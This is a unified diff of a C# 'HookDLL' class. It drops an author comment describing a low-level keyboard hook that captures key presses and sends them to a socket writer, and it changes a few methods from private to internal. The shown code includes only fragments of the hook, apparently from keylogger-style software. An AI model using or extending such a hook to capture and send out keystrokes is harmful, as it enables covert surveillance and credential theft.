@@ -1,11 +1,4 @@
-﻿/*
-* Author: Ursachi Octavian
-* Date: 26.05.2024
-* Functionality: This class provides a low-level keyboard hook for capturing key presses and sending them to a socket writer for logging.
-*/
-
-
-using Microsoft.Win32;
+﻿using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -57,7 +50,7 @@ namespace HookDLL
             }
         }
 
-        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        internal static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             /* A keyDown event has occured */
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
@@ -76,7 +69,7 @@ namespace HookDLL
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+        internal static extern bool UnhookWindowsHookEx(IntPtr hhk);
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
@@ -84,6 +77,5 @@ namespace HookDLL
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
-
     }
 }
